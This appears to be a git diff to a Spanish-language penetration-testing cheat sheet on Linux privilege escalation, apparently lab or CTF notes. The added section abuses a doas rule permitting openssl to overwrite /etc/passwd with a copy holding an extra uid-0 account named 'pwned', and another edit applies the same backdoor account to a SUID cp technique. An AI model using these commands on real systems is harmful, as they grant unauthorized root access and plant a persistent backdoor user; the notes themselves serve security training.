@@ -64,6 +64,29 @@ Forma 2:
 
 ❯ sudo su   # Cambiar a root 
 ```
+
+## Doas
+```bash 
+-rwsr-xr-x 1 root root /usr/bin/doas 
+
+Paso 1: Desde la máquina víctima 
+❯ cat /etc/doas.conf    # Verificar la configuración (Que puedes hacer)
+	permit nopass plot_admin as root cmd openssl
+
+Paso 2: Desde Kali 
+# Genera un hash de password openssl passwd -1 -salt xyz hacked123
+❯ openssl passwd -1 -salt hax Password123    # Generar una password en Kali 
+	$1$hax$pfAXe0eaZZrVNJ0411ItB/
+
+Paso 3: Desde la máquina víctima 
+# Creaar un nuevo usuario root en /etc/passwd
+❯ cp /etc/passwd- ~/passwd.new   # Copiar el archivo 
+❯ echo 'pwned:$1$hax$pfAXe0eaZZrVNJ0411ItB/:0:0:root:/root:/bin/bash' >> ~/passwd.new   # Agregar el usuario 
+❯ tail -3 ~/passwd.new  
+❯ doas openssl enc -in ~/passwd.new -out /etc/passwd    # Sustituir el /passwd.new al del sistema 
+❯ su pwned 
+```
+
 ## Find 
 ```bash 
 -rwsr-xr-x 1 root root /usr/bin/find 
@@ -85,11 +108,13 @@ Forma 2:
 ❯ openssl passwd -1 -salt hax Password123    # Generar una password en Kali 
 	$1$hax$pfAXe0eaZZrVNJ0411ItB/
 
-❯ cp /etc/passwd /tmp/p && echo 'capibara:$1$hax$pfAXe0eaZZrVNJ0411ItB/:0:0::/root:/bin/bash' >> /tmp/p 
+❯ cp /etc/passwd /tmp/p && echo 'pwned:$1$hax$pfAXe0eaZZrVNJ0411ItB/:0:0::/root:/bin/bash' >> /tmp/p 
 # Utilizar el CP normal sin SUID en la máquina víctima linux paara hacer una copia del /etc/passwd 
 
 ❯ /usr/bin/cp /tmp/p /etc/passwd
 # Utilizar el CP con suid en la máquina víctima linux para sobreescribir el /etc/passwd
+
+❯ su pwned    # Ingresar como root con el usuario agregado 
 ```
 ## Monitor 
 ```bash 
